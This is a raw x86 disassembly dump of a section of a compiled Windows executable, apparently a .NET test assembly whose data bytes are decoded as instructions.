  4026d6:	xor    BYTE PTR cs:[esi],ch
  4026d9:	xor    esi,DWORD PTR [eax]
  4026db:	xor    esi,DWORD PTR [ecx]
  4026dd:	cmp    DWORD PTR [eax],eax
  4026df:	add    BYTE PTR [eax],al
  4026e1:	add    BYTE PTR ds:0x6c00,al
  4026e7:	add    BYTE PTR [edi+eax*1],al
  4026ea:	add    BYTE PTR [eax],al
  4026ec:	and    edi,DWORD PTR [esi+0x0]
  4026ef:	add    BYTE PTR [eax+0x7],dh
  4026f2:	add    BYTE PTR [eax],al
  4026f4:	sub    al,0xe
  4026f6:	add    BYTE PTR [eax],al
  4026f8:	and    edx,DWORD PTR [ebx+0x74]
  4026fb:	jb     0x402766
  4026fd:	outs   dx,BYTE PTR ds:[esi]
  4026fe:	addr16 jae 0x402701
  402701:	add    BYTE PTR [eax],al
  402703:	add    BYTE PTR [ebp+edx*1+0x9280000],bl
  40270a:	add    BYTE PTR [eax],al
  40270c:	and    edx,DWORD PTR [ebp+0x53]
  40270f:	add    ah,al
  402711:	push   ds
  402712:	add    BYTE PTR [eax],al
  402714:	adc    BYTE PTR [eax],al
  402716:	add    BYTE PTR [eax],al
  402718:	and    eax,DWORD PTR [edi+0x55]
  40271b:	dec    ecx
  40271c:	inc    esp
  40271d:	add    BYTE PTR [eax],al
  40271f:	add    ah,dl
  402721:	push   ds
  402722:	add    BYTE PTR [eax],al
  402724:	and    al,0x7
  402726:	add    BYTE PTR [eax],al
  402728:	and    eax,DWORD PTR [edx+0x6c]
  40272b:	outs   dx,DWORD PTR ds:[esi]
  40272c:	bound  eax,QWORD PTR [eax]
  40272e:	add    BYTE PTR [eax],al
  402730:	add    BYTE PTR [eax],al
  402732:	add    BYTE PTR [eax],al
  402734:	add    al,BYTE PTR [eax]
  402736:	add    BYTE PTR [ecx],al
  402738:	push   edi
  402739:	pop    ss
  40273a:	add    al,BYTE PTR [edx]
  40273c:	or     DWORD PTR [eax],eax
  40273e:	add    BYTE PTR [eax],al
  402740:	add    dl,bh
  402742:	and    eax,0x160033
  402747:	add    BYTE PTR [ecx],al
  402749:	add    BYTE PTR [eax],al
  40274b:	add    BYTE PTR [eax+eax*1+0x0],cl
  40274f:	add    BYTE PTR [edx],al
  402751:	add    BYTE PTR [eax],al
  402753:	add    BYTE PTR [edi],al
  402755:	add    BYTE PTR [eax],al
  402757:	add    BYTE PTR [esi],cl
  402759:	add    BYTE PTR [eax],al
  40275b:	add    BYTE PTR [eax+eax*1],cl
  40275e:	add    BYTE PTR [eax],al
  402760:	add    al,BYTE PTR [eax]
  402762:	add    BYTE PTR [eax],al
  402764:	pop    edx
  402765:	add    BYTE PTR [eax],al
  402767:	add    BYTE PTR [eax+eax*1],dl
  40276a:	add    BYTE PTR [eax],al
  40276c:	add    eax,0x2000000
  402771:	add    BYTE PTR [eax],al
  402773:	add    BYTE PTR [ecx],al
  402775:	add    BYTE PTR [eax],al
  402777:	add    BYTE PTR [edx],cl
  402779:	add    BYTE PTR [eax],al
  40277b:	add    BYTE PTR [eax],al
  40277d:	add    BYTE PTR [edx],cl
  40277f:	add    BYTE PTR [ecx],al
  402781:	add    BYTE PTR [eax],al
  402783:	add    BYTE PTR [eax],al
  402785:	add    BYTE PTR [esi],al
  402787:	add    BYTE PTR [eax+eax*1+0x55],bl
  40278b:	add    BYTE PTR [edx],cl
  40278d:	add    BYTE PTR [ebx+0xa002500],ah
  402793:	add    BYTE PTR [ebp+0xe002500],dh
  402799:	add    bl,dh
  40279b:	add    BYTE PTR ds:0x4a001200,ah
  4027a1:	add    DWORD PTR ds:0x70000601,esp
  4027a7:	add    DWORD PTR [edi+0x1],ebx
  4027aa:	push   ss
  4027ab:	add    BYTE PTR [edi+0x6018c01],bl
  4027b1:	add    bh,al
  4027b3:	add    DWORD PTR [edi+0x1],ebx
  4027b6:	push   es
  4027b7:	add    BYTE PTR [eax],bl
  4027b9:	add    dl,BYTE PTR [ebp+0x0]
  4027bc:	or     al,BYTE PTR [eax]
  4027be:	pop    ecx
  4027bf:	add    ah,BYTE PTR ds:0xad000600
  4027c5:	add    dl,BYTE PTR [ebp+0x0]
  4027c8:	or     al,BYTE PTR [eax]
  4027ca:	retf   
  4027cb:	add    ah,BYTE PTR ds:0xcf000600
  4027d1:	add    esi,DWORD PTR [ebp+0x7000603]
  4027d7:	add    al,0xe8
  4027d9:	add    eax,DWORD PTR [esi]
  4027db:	add    BYTE PTR [ebx],bl
  4027dd:	add    al,0x55
  4027df:	add    BYTE PTR [esi],al
  4027e1:	add    BYTE PTR [ebx+0x4],al
  4027e4:	xor    DWORD PTR [esi+eax*1],eax
  4027e7:	add    BYTE PTR [edx+0x4],bl
  4027ea:	xor    DWORD PTR [esi+eax*1],eax
  4027ed:	add    BYTE PTR [edi+0x4],dh
  4027f0:	xor    DWORD PTR [esi+eax*1],eax
  4027f3:	add    BYTE PTR [ebp+0x6043104],dl
  4027f9:	add    BYTE PTR [esi+0x6043104],ch
  4027ff:	add    bh,al
  402801:	add    al,0x31
  402803:	add    al,0x6
  402805:	add    dl,ah
  402807:	add    al,0x31
  402809:	add    al,0x6
  40280b:	add    bl,bh
  40280d:	add    al,0x31
  40280f:	add    al,0x6
  402811:	add    BYTE PTR [eax],bl
  402813:	add    eax,0x60431
  402818:	dec    edi
  402819:	add    eax,0x6053e
  40281e:	jno    0x402825
  402820:	ds add eax,0x5930006
  402826:	xor    DWORD PTR [esi+eax*1],eax
  402829:	add    BYTE PTR [esi+0x6043105],ch
  40282f:	add    bh,al
  402831:	add    eax,0x60431
  402836:	add    eax,0x605e506
  40283b:	add    BYTE PTR [ebx],ah
  40283d:	push   es
  40283e:	mov    WORD PTR [ecx],es
  402840:	jg     0x402842
  402842:	aaa    
  402843:	push   es
  402844:	add    BYTE PTR [eax],al
  402846:	push   es
  402847:	add    BYTE PTR [esi+0x6],al
  40284a:	in     eax,0x5
  40284c:	push   es
  40284d:	add    BYTE PTR [eax+0x6],dh
  402850:	push   ebp
  402851:	add    BYTE PTR [esi],al
  402853:	add    BYTE PTR [esi+eax*1+0xa0055],cl
  40285a:	mov    esi,0x6069f06
  40285f:	add    cl,dh
  402861:	push   es
  402862:	push   ebp
  402863:	add    BYTE PTR [esi],al
  402865:	add    BYTE PTR ds:0x6005507,cl
  40286b:	add    BYTE PTR [ebx+0x7],al
  40286e:	xor    DWORD PTR [esi+eax*1],eax
  402871:	add    BYTE PTR [ecx+0x7],ah
  402874:	xor    DWORD PTR [esi+eax*1],eax
  402877:	add    BYTE PTR [edi+0x7],bh
  40287a:	push   ebp
  40287b:	add    BYTE PTR [edx],cl
  40287d:	add    BYTE PTR [eax+0xa078d07],bh
  402883:	add    bh,dl
  402885:	pop    es
  402886:	lea    eax,[edi]
  402888:	or     al,BYTE PTR [eax]
  40288a:	or     DWORD PTR [eax],ecx
  40288c:	lea    eax,[edi]
  40288e:	sbb    al,BYTE PTR [eax]
  402890:	lahf   
  402891:	or     BYTE PTR [edx+0x8],dh
  402894:	push   es
  402895:	add    BYTE PTR [ebp+0x1e005508],ch
  40289b:	add    BYTE PTR [ecx],dh
  40289d:	or     DWORD PTR [esi],eax
  40289f:	or     DWORD PTR [esi],ebx
  4028a1:	add    BYTE PTR [edx],bh
  4028a3:	or     DWORD PTR [esi],eax
  4028a5:	or     DWORD PTR [esi],eax
  4028a7:	add    BYTE PTR [ebx+0x6098e09],ah
  4028ad:	add    dh,al
  4028af:	or     DWORD PTR [ebp+0x0],edx
  4028b2:	push   es
  4028b3:	add    ah,cl
  4028b5:	or     DWORD PTR [esi-0x26fff9f7],ecx
  4028bb:	or     DWORD PTR [ebp+0x0],edx
  4028be:	push   es
  4028bf:	add    BYTE PTR ds:0x600550a,cl
  4028c5:	add    BYTE PTR [edi],dl
  4028c7:	or     bl,BYTE PTR [edi+0x1]
  4028ca:	push   es
  4028cb:	add    BYTE PTR [edx+ecx*1],dh
  4028ce:	push   ebp
  4028cf:	add    BYTE PTR [edx],cl
  4028d1:	add    BYTE PTR [esi+0xa00250a],cl
  4028d7:	add    BYTE PTR [ecx+0xa00250a],ah
  4028dd:	add    dh,al
  4028df:	or     cl,BYTE PTR [ebp+0xc000a07]
  4028e5:	or     ecx,DWORD PTR [ebp+0x4b002207]
  4028eb:	or     ebp,DWORD PTR [edx]
  4028ed:	or     ecx,DWORD PTR [edx]
  4028ef:	add    BYTE PTR [edx+0x60b760b],ah
  4028f5:	add    dl,ch
  4028f7:	or     edx,DWORD PTR [ebp+0x0]
  4028fa:	push   es
  4028fb:	add    dl,bh
  4028fd:	or     ebx,DWORD PTR [edi+0x1]
  402900:	push   es
  402901:	add    BYTE PTR ds:0x600550c,dl
  402907:	add    BYTE PTR [ecx+0xc],cl
  40290a:	mov    cs,WORD PTR [ecx]
  40290c:	add    BYTE PTR es:[edx+0xa00250c],ah
  402913:	add    ch,ah
  402915:	or     al,0x25
  402917:	add    BYTE PTR [esi],al
  402919:	add    BYTE PTR [edi],al
  40291b:	or     eax,0x60055
  402920:	or     al,0xd
  402922:	push   ebp
  402923:	add    BYTE PTR [esi],al
  402925:	add    BYTE PTR [eax],dh
  402927:	or     eax,0x1a0055
  40292c:	ins    BYTE PTR es:[edi],dx
  40292d:	or     eax,0x220d44
  402932:	or     eax,0x2a00550a
  402937:	add    BYTE PTR [edx+0x1],cl
  40293a:	and    eax,0xd0000601
  40293f:	or     eax,0x60b2a
  402944:	loopne 0x402953
  402946:	sub    cl,BYTE PTR [ebx]
  402948:	push   es
  402949:	add    BYTE PTR [eax],dl
  40294b:	push   cs
  40294c:	pop    edi
  40294d:	add    DWORD PTR [eax],eax
  40294f:	add    BYTE PTR [eax],al
  402951:	add    BYTE PTR [ecx],al
  402953:	add    BYTE PTR [eax],al
  402955:	add    BYTE PTR [eax],al
  402957:	add    BYTE PTR [ecx],al
  402959:	add    BYTE PTR [ecx],al
  40295b:	add    BYTE PTR [eax],al
  40295d:	add    BYTE PTR [eax],dl
  40295f:	add    BYTE PTR [eax],bl
  402961:	add    BYTE PTR ds:0x1000500,ah
  402967:	add    BYTE PTR [ecx],al
  402969:	add    BYTE PTR [ebx],al
  40296b:	add    bh,bh
  40296d:	add    BYTE PTR [ebx],dl
  40296f:	add    BYTE PTR [ecx],al
  402971:	add    BYTE PTR [ebp+0x1],dl
  402974:	pop    ss
  402975:	add    BYTE PTR [ecx],al
  402977:	add    BYTE PTR [esi+0x1],dh
  40297a:	sbb    eax,DWORD PTR [eax]
  40297c:	add    DWORD PTR [eax],eax
  40297e:	add    DWORD PTR [ecx],0x1001f
  402984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402985:	add    DWORD PTR [edx],esp
  402987:	add    BYTE PTR [ecx],al
  402989:	add    BYTE PTR [ebp+0x1001f01],dh
  40298f:	add    al,bl
  402991:	add    DWORD PTR [esi],esp
  402993:	add    BYTE PTR [eax+0x21],dl
  402996:	add    BYTE PTR [eax],al
  402998:	add    BYTE PTR [eax],al
  40299a:	sbb    DWORD PTR [eax],0x2a01e8
  4029a0:	add    DWORD PTR [eax],eax
  4029a2:	and    DWORD PTR fs:[eax],eax
  4029a5:	add    BYTE PTR [eax],al
  4029a7:	add    BYTE PTR [esi+0x2e01e818],al
  4029ad:	add    BYTE PTR [ecx],al
  4029af:	add    BYTE PTR [ecx+0x21],al
  4029b5:	add    dh,al
  4029b7:	add    dh,ch
  4029b9:	add    DWORD PTR ds:0x84000400,esi
  4029bf:	and    DWORD PTR [eax],eax
  4029c1:	add    BYTE PTR [eax],al
  4029c3:	add    BYTE PTR [ecx+0x39020800],dl
  4029c9:	add    BYTE PTR [eax+eax*1],al
  4029cc:	inc    esp
  4029cd:	and    eax,DWORD PTR [eax]
  4029cf:	add    BYTE PTR [eax],al
  4029d1:	add    BYTE PTR [ecx+0x2e020d00],al
  4029d7:	add    BYTE PTR ds:0x23b000,al
  4029dd:	add    BYTE PTR [eax],al
  4029df:	add    BYTE PTR [ecx+0x3f023400],al
  4029e5:	add    BYTE PTR [eax],cl
  4029e7:	add    ah,dh
  4029e9:	and    eax,DWORD PTR [eax]
  4029eb:	add    BYTE PTR [eax],al
  4029ed:	add    BYTE PTR [ecx+0x2a025500],al
  4029f3:	add    BYTE PTR [edx],cl
  4029f5:	add    al,ah
  4029f7:	and    al,0x0
  4029f9:	add    BYTE PTR [eax],al
  4029fb:	add    BYTE PTR [ecx+0x46027000],al
  402a01:	add    BYTE PTR [edx],cl
  402a03:	add    al,cl
  402a05:	and    eax,0x0
  402a0a:	add    DWORD PTR [eax],0x2a0285
  402a10:	or     al,BYTE PTR [eax]
  402a12:	aad    0x25
  402a14:	add    BYTE PTR [eax],al
  402a16:	add    BYTE PTR [eax],al
  402a18:	add    DWORD PTR [eax],0x2a0293
  402a1e:	or     al,BYTE PTR [eax]
  402a20:	icebp  
  402a21:	and    eax,0x0
  402a26:	xchg   ecx,eax
  402a27:	add    BYTE PTR [eax+0xa004b02],ah
  402a2d:	add    BYTE PTR [eax],cl
  402a2f:	add    BYTE PTR es:[eax],al
  402a32:	add    BYTE PTR [eax],al
  402a34:	add    DWORD PTR [eax],0x5002b7
  402a3a:	or     eax,DWORD PTR [eax]
  402a3c:	xchg   esp,eax
  402a3d:	add    BYTE PTR es:[eax],al
  402a40:	add    BYTE PTR [eax],al
  402a42:	loope  0x402a45
  402a44:	fadd   DWORD PTR [edx]
  402a46:	push   edi
  402a47:	add    BYTE PTR ds:0x269c00,cl
  402a4d:	add    BYTE PTR [eax],al
  402a4f:	add    cl,ah
  402a51:	add    DWORD PTR [edi],esi
  402a53:	add    ebp,DWORD PTR [edx]
  402a55:	add    BYTE PTR ds:0x1000000,cl
  402a5b:	add    BYTE PTR [esi+0x3],bh
  402a5e:	add    BYTE PTR [eax],al
  402a60:	add    al,BYTE PTR [eax]
  402a62:	xchg   DWORD PTR [ebx],eax
  402a64:	add    BYTE PTR [eax],al
  402a66:	add    eax,DWORD PTR [eax]
  402a68:	xchg   ebp,eax
  402a69:	add    eax,DWORD PTR [eax]
  402a6b:	add    BYTE PTR [ecx],al
  402a6d:	add    BYTE PTR [ebp+0x1000003],ah
  402a73:	add    BYTE PTR [esi+0x3],bh
  402a76:	add    BYTE PTR [eax],al
  402a78:	add    al,BYTE PTR [eax]
  402a7a:	xchg   DWORD PTR [ebx],eax
  402a7c:	add    BYTE PTR [eax],al
  402a7e:	add    eax,DWORD PTR [eax]
  402a80:	xchg   ebp,eax
  402a81:	add    eax,DWORD PTR [eax]
  402a83:	add    BYTE PTR [ecx],al
  402a85:	add    BYTE PTR [edx+0x2000003],ch
  402a8b:	add    BYTE PTR [ecx+0x1000003],dh
  402a91:	add    BYTE PTR [ebx+0x1000003],dh
  402a97:	add    BYTE PTR [edx+0x2000003],ch
  402a9d:	add    BYTE PTR [ebp+0x9000203],ah
  402aa3:	add    BYTE PTR [edx],al
  402aa5:	add    BYTE PTR ds:0x24001100,cl
  402aab:	add    edx,DWORD PTR [edi+0x0]
  402aae:	sbb    DWORD PTR [eax],eax
  402ab0:	jne    0x402ab5
  402ab2:	sub    al,BYTE PTR [eax]
  402ab4:	imul   eax,DWORD PTR [eax],0x5c01e8
  402aba:	jno    0x402abc
  402abc:	call   0x79408bc2
  402ac1:	add    al,ch
  402ac3:	add    DWORD PTR [ecx+0x0],esp
  402ac6:	add    DWORD PTR [eax],0x5c01e8
  402acc:	mov    DWORD PTR [eax],eax
  402ace:	call   0x914086d4
  402ad3:	add    al,ch
  402ad5:	add    DWORD PTR [eax+eax*1-0x67],ebx
  402ad9:	add    al,ch
  402adb:	add    DWORD PTR [eax+eax*1-0x5f],ebx
  402adf:	add    al,ch
  402ae1:	add    DWORD PTR [eax+eax*1-0x57],ebx
  402ae5:	add    al,ch
  402ae7:	add    DWORD PTR [eax+eax*1-0x4f],ebx
  402aeb:	add    al,ch
  402aed:	add    DWORD PTR [eax+eax*1-0x47],ebx
  402af1:	add    al,ch
  402af3:	add    DWORD PTR [eax+eax*1-0x3f],ebx
  402af7:	add    al,ch
  402af9:	add    DWORD PTR [eax+eax*1-0x37],ebx
  402afd:	add    al,ch
  402aff:	add    DWORD PTR [eax+eax*1-0x2f],ebx
  402b03:	add    al,ch
  402b05:	add    DWORD PTR [eax+eax*1-0x27],ebx
  402b09:	add    al,ch
  402b0b:	add    DWORD PTR [ecx+0x0],esp
  402b0e:	loope  0x402b10
  402b10:	call   0xe9408716
  402b15:	add    al,ch
  402b17:	add    DWORD PTR [esi+0x0],esp
  402b1a:	icebp  
  402b1b:	add    al,ch
  402b1d:	add    DWORD PTR [edx],ebp
  402b1f:	add    cl,bh
  402b21:	add    al,ch
  402b23:	add    DWORD PTR [eax+eax*1+0x9],ebp
  402b27:	add    eax,ebp
  402b29:	add    DWORD PTR [ebx+0x0],esi
  402b2c:	inc    ecx
  402b2d:	add    al,ch
  402b2f:	add    DWORD PTR [ecx+0x0],esp
  402b32:	or     DWORD PTR [eax],eax
  402b34:	call   0x1140553a
  402b39:	add    eax,ebp
  402b3b:	add    DWORD PTR [edx],ebx
  402b3d:	add    DWORD PTR [ecx],esp
  402b3f:	add    edx,ecx
  402b41:	push   es
  402b42:	sub    al,BYTE PTR [ecx]
  402b44:	and    DWORD PTR [ecx],eax
  402b46:	rol    DWORD PTR [esi],cl
  402b48:	das    
  402b49:	add    DWORD PTR [ecx],esp
  402b4b:	add    esi,esp
  402b4d:	push   es
  402b4e:	jae    0x402b50
  402b50:	sub    DWORD PTR [ecx],eax
  402b52:	sti    
  402b53:	push   es
  402b54:	xor    eax,0xe8013101
  402b59:	add    DWORD PTR [ebx],edi
  402b5b:	add    DWORD PTR [ecx],ebp
  402b5d:	add    DWORD PTR [edi+eax*1],ebp
  402b60:	inc    ecx
  402b61:	add    DWORD PTR [ecx],edi
  402b63:	add    DWORD PTR [edi+eax*1+0x48],ecx
  402b67:	add    DWORD PTR [ecx],edi
  402b69:	add    DWORD PTR [esi+0x7],ebp
  402b6c:	dec    esi
  402b6d:	add    DWORD PTR [ecx+0x1],eax
  402b70:	jbe    0x402b79
  402b72:	push   esp
  402b73:	add    DWORD PTR [ecx+0x1],ecx
  402b76:	xchg   BYTE PTR [edi],al
  402b78:	pop    eax
  402b79:	add    DWORD PTR [ecx+0x1],edx
  402b7c:	retf   
  402b7d:	pop    es
  402b7e:	pop    esi
  402b7f:	add    DWORD PTR [ecx+0x1],ebx
  402b82:	jmp    0x402b8b
  402b84:	arpl   WORD PTR [ecx],ax
  402b86:	pop    ecx
  402b87:	add    ecx,edi
  402b89:	pop    es
  402b8a:	pop    esi
  402b8b:	add    DWORD PTR [ecx+0x1],esp
  402b8e:	sbb    eax,0x61015e08
  402b93:	add    DWORD PTR [ebx],esi
  402b95:	or     BYTE PTR [eax+0x1],ch
  402b98:	imul   eax,DWORD PTR [ecx],0x15e08a8
  402b9e:	dec    ecx
  402b9f:	add    DWORD PTR [esi+0x49016e08],edi
  402ba5:	add    ebp,eax
  402ba7:	or     BYTE PTR [esi+0x1],dh
  402baa:	imul   eax,DWORD PTR [ecx],0x15e08d3
  402bb0:	jns    0x402bb3
  402bb2:	inc    ebp
  402bb3:	or     DWORD PTR [ebx+0x1],edi
  402bb6:	add    DWORD PTR [ecx],0x1540972
  402bbc:	pop    ecx
  402bbd:	add    DWORD PTR [ebx+0x9],edi
  402bc0:	pop    esi
  402bc1:	add    DWORD PTR [ecx-0x7ef64bff],ecx
  402bc7:	add    DWORD PTR [ecx-0x78f616ff],edx
  402bcd:	add    DWORD PTR [ecx+0x1],ecx
  402bd0:	xchg   BYTE PTR [edi],al
  402bd2:	xchg   esp,eax
  402bd3:	add    DWORD PTR [ecx],esp
  402bd5:	add    edx,esi
  402bd7:	or     DWORD PTR [ebx+0x0],esi
  402bda:	mov    cl,0x1
  402bdc:	call   0x314166e2
  402be1:	add    al,ch
  402be3:	add    DWORD PTR [esi+0x25003901],esp
  402be9:	or     dh,BYTE PTR [eax-0x17fe46ff]
  402bef:	add    DWORD PTR [ebx],edi
  402bf1:	add    DWORD PTR [ecx],edi
  402bf3:	add    BYTE PTR [ecx+0xa],al
  402bf6:	mov    dh,0x1
  402bf8:	cmp    DWORD PTR [eax],eax
  402bfa:	dec    esp
  402bfb:	or     ah,BYTE PTR [ecx+0x0]
  402bfe:	dec    ecx
  402bff:	add    BYTE PTR [edx+ecx*1-0x43],ah
  402c03:	add    DWORD PTR [ecx],esp
  402c05:	add    BYTE PTR [esi+0xa],dh
  402c08:	sub    al,BYTE PTR [eax]
  402c0a:	rol    DWORD PTR [ecx],0xb6
  402c0d:	or     al,dh
  402c0f:	add    DWORD PTR [ecx+0x0],esp
  402c12:	out    0xa,eax
  402c14:	int3   
  402c15:	add    ecx,edx
  402c17:	add    DWORD PTR [ecx],ebx
  402c19:	or     edx,edx
  402c1b:	add    ecx,ebx
  402c1d:	add    DWORD PTR [ebx+ecx*1-0x28],ebx
  402c21:	add    DWORD PTR [ecx],esp
  402c23:	add    al,ch
  402c25:	add    edi,ebx
  402c27:	add    DWORD PTR [ecx+0x0],edx
  402c2a:	mov    dh,0xb
  402c2c:	jmp    0xc841a532
  402c31:	or     edi,DWORD PTR [ebx+0x1]
  402c34:	icebp  
  402c35:	add    ecx,esi
  402c37:	or     edx,DWORD PTR [ecx+eax*1-0x7]
  402c3b:	add    DWORD PTR ds:0x6901bd0c,eax
  402c41:	add    DWORD PTR ds:0x1015e0c,ecx
  402c47:	add    ah,BYTE PTR [ecx]
  402c49:	or     al,0xef
  402c4b:	add    DWORD PTR [ecx+0x1],edi
  402c4e:	xor    DWORD PTR [ebx+esi*8],ecx
  402c51:	add    DWORD PTR [ecx],ecx
  402c53:	add    dl,BYTE PTR [ebp+0xc]
  402c56:	or     eax,DWORD PTR [edx]
  402c58:	adc    DWORD PTR [edx],eax
  402c5a:	ret    
  402c5b:	or     al,0x1f
  402c5d:	add    BYTE PTR [ecx+0x1],cl
  402c60:	fimul  WORD PTR [ecx+edx*1]
  402c63:	add    ch,BYTE PTR [ecx+0x1]
  402c66:	test   al,0x8
  402c68:	sbb    eax,DWORD PTR [edx]
  402c6a:	and    DWORD PTR [edx],eax
  402c6c:	push   ds
  402c6d:	or     eax,0x2310222
  402c72:	cmp    cl,BYTE PTR ds:0x169022b
  402c78:	or     eax,0x19021b0c
  402c7d:	add    dh,BYTE PTR [eax+0x2]
  402c80:	xor    eax,DWORD PTR [edx]
  402c82:	imul   eax,DWORD PTR [ecx],0x21b08d3
  402c88:	cmp    DWORD PTR [edx],eax
  402c8a:	jl     0x402c99
  402c8c:	cmp    al,BYTE PTR [edx]
  402c8e:	jns    0x402c91
  402c90:	nop
  402c91:	or     eax,0x15101f3
  402c96:	mov    cl,0xd
  402c98:	push   edi
  402c99:	add    dl,BYTE PTR [ecx+0x2]
  402c9c:	jmp    0x614289ae
  402ca1:	add    DWORD PTR [eax+0x39026402],esp
  402ca7:	add    bl,bh
  402ca9:	or     eax,0x191026b
  402cae:	icebp  
  402caf:	or     ebp,DWORD PTR [edi+0x2]
  402cb2:	imul   eax,DWORD PTR [ecx],0x21b0e08
  402cb8:	popa   
  402cb9:	add    ah,BYTE PTR [eax]
  402cbb:	push   cs
  402cbc:	mov    ebp,0x24002101
  402cc1:	push   cs
  402cc2:	add    BYTE PTR [edx],0x2e
  402cc5:	add    BYTE PTR [ebx+0x0],bl
  402cc8:	pop    ds
  402cc9:	add    ebp,DWORD PTR [esi]
  402ccb:	add    BYTE PTR [ebx],bl
  402ccd:	add    BYTE PTR [edi+0x23002e02],al
  402cd3:	add    BYTE PTR [edi+0x2b002e02],bh
  402cd9:	add    ch,al
  402cdb:	add    ch,BYTE PTR [esi]
  402cdd:	add    BYTE PTR [ebx],dh
  402cdf:	add    bl,cl
  402ce1:	add    ch,BYTE PTR [esi]
  402ce3:	add    BYTE PTR [ebx],bh
  402ce5:	add    bl,cl
  402ce7:	add    ch,BYTE PTR [esi]
  402ce9:	add    BYTE PTR [ebx+0x0],al
  402cec:	retf   
  402ced:	add    ch,BYTE PTR [esi]
  402cef:	add    BYTE PTR [ebx+0x0],cl
  402cf2:	fiadd  WORD PTR [edx]
  402cf4:	add    BYTE PTR cs:[ebx+0x0],dl
  402cf8:	stc    
  402cf9:	add    ch,BYTE PTR [esi]
  402cfb:	add    BYTE PTR [ebx+0x2e02c500],cl
  402d01:	add    BYTE PTR [ebx+0x2e071b00],dh
  402d07:	add    BYTE PTR [ebx+0x0],dh
  402d0a:	push   ebx
  402d0b:	add    ebp,DWORD PTR [esi]
  402d0d:	add    BYTE PTR [ebx+0x0],bh
  402d10:	add    ebp,DWORD PTR gs:[esi]
  402d13:	add    BYTE PTR [ebx+0x2e037300],al
  402d19:	add    BYTE PTR [ebx+0x0],ch
  402d1c:	push   ebx
  402d1d:	add    ebp,DWORD PTR [esi]
  402d1f:	add    BYTE PTR [ebx+0x2e037e00],dl
  402d25:	add    BYTE PTR [ebx+0x2e03a900],bl
  402d2b:	add    BYTE PTR [ebx+0x2e06f300],ah
  402d31:	add    BYTE PTR [ebx-0x7ff8ee00],ch
  402d37:	add    bl,cl
  402d39:	add    BYTE PTR [ecx],ah
  402d3b:	add    DWORD PTR [edx-0x5fe3eff],ebx
  402d41:	add    DWORD PTR [ecx+0x2],eax
  402d44:	jbe    0x402d48
  402d46:	add    al,BYTE PTR [eax]
  402d48:	sbb    al,BYTE PTR [eax]
  402d4a:	add    eax,DWORD PTR [eax]
  402d4c:	add    al,BYTE PTR [eax]
  402d4e:	sbb    al,0x0
  402d50:	add    eax,0x800400
  402d55:	add    BYTE PTR [ebx],cl
  402d57:	add    BYTE PTR [eax],al
  402d59:	add    BYTE PTR [eax],al
  402d5b:	add    BYTE PTR [eax],al
  402d5d:	add    BYTE PTR [ecx],al
  402d5f:	add    BYTE PTR [eax],al
  402d61:	add    BYTE PTR [eax+0x0],bh
  402d64:	pushw  es
  402d66:	add    BYTE PTR [eax],al
  402d68:	add    al,0x0
	...
  402d72:	add    BYTE PTR [eax],al
  402d74:	add    DWORD PTR [eax],eax
  402d76:	dec    esp
  402d77:	add    BYTE PTR [eax],al
  402d79:	add    BYTE PTR [eax],al
  402d7b:	add    BYTE PTR [ebx],cl
	...
  402d85:	add    BYTE PTR [eax],al
  402d87:	add    BYTE PTR [edx],cl
  402d89:	add    BYTE PTR [edi+0x0],ch
  402d8c:	add    BYTE PTR [eax],al
  402d8e:	add    BYTE PTR [eax],al
  402d90:	or     eax,DWORD PTR [eax]
	...
  402d9a:	add    BYTE PTR [eax],al
  402d9c:	or     al,BYTE PTR [eax]
  402d9e:	ret    
  402d9f:	add    BYTE PTR [eax],al
  402da1:	add    BYTE PTR [eax],al
  402da3:	add    BYTE PTR [eax+eax*1],al
	...
  402dae:	add    BYTE PTR [eax],al
  402db0:	add    DWORD PTR [eax],eax
  402db2:	or     eax,0x1
  402db7:	add    BYTE PTR [eax+eax*1],al
	...
  402dc2:	add    BYTE PTR [eax],al
  402dc4:	add    DWORD PTR [eax],eax
  402dc6:	push   ebp
  402dc7:	add    BYTE PTR [eax],al
  402dc9:	add    BYTE PTR [eax],al
  402dcb:	add    BYTE PTR [ebx],cl
	...
  402dd5:	add    BYTE PTR [eax],al
  402dd7:	add    BYTE PTR [edx],cl
  402dd9:	add    BYTE PTR [edi+0x8],al
  402ddc:	add    BYTE PTR [eax],al
  402dde:	add    BYTE PTR [eax],al
  402de0:	or     eax,DWORD PTR [eax]
	...
  402dea:	add    BYTE PTR [eax],al
  402dec:	or     al,BYTE PTR [eax]
  402dee:	(bad)  [eax]
  402df0:	add    BYTE PTR [eax],al
  402df2:	add    BYTE PTR [eax],al
  402df4:	add    al,BYTE PTR [eax]
	...
  402dfe:	add    BYTE PTR [eax],al
  402e00:	add    DWORD PTR [eax],eax
  402e02:	dec    esp
  402e03:	add    BYTE PTR [eax],al
  402e05:	add    BYTE PTR [eax],al
  402e07:	add    BYTE PTR [ebx],cl
	...
  402e11:	add    BYTE PTR [eax],al
  402e13:	add    BYTE PTR [edx],cl
  402e15:	add    BYTE PTR [edx+0xc],ch
  402e18:	add    BYTE PTR [eax],al
  402e1a:	add    BYTE PTR [eax],al
  402e1c:	add    al,BYTE PTR [eax]
	...
  402e26:	add    BYTE PTR [eax],al
  402e28:	add    DWORD PTR [eax],eax
  402e2a:	or     eax,0x1
  402e2f:	add    BYTE PTR [eax],al
  402e31:	add    BYTE PTR [eax],al
  402e33:	add    BYTE PTR [eax],al
  402e35:	cmp    al,0x4d
  402e37:	outs   dx,DWORD PTR ds:[esi]
  402e38:	fs jne 0x402ea7
  402e3b:	gs add BYTE PTR ds:[ecx+0x54],dl
  402e40:	inc    ecx
  402e41:	outs   dx,BYTE PTR gs:[si]
  402e44:	je     0x402e79
  402e46:	xor    ch,BYTE PTR [esi]
  402e48:	gs js  0x402eb0
  402e4b:	add    BYTE PTR [ecx+0x67],al
  402e4e:	outs   dx,BYTE PTR gs:[esi]
  402e50:	je     0x402ea2
  402e52:	jb     0x402ec3
  402e54:	arpl   WORD PTR [ebp+0x73],sp
  402e57:	jae    0x402e59
  402e59:	dec    ebp
  402e5a:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402e61:	je     0x402e91
  402e63:	push   esi
  402e64:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  402e6b:	jne    0x402ed1
  402e6d:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  402e74:	push   esp
  402e75:	outs   dx,DWORD PTR ds:[esi]
  402e76:	outs   dx,DWORD PTR ds:[esi]
  402e77:	ins    BYTE PTR es:[edi],dx
  402e78:	jae    0x402ea8
  402e7a:	inc    ecx
  402e7b:	outs   dx,BYTE PTR gs:[si]
  402e7e:	je     0x402e80
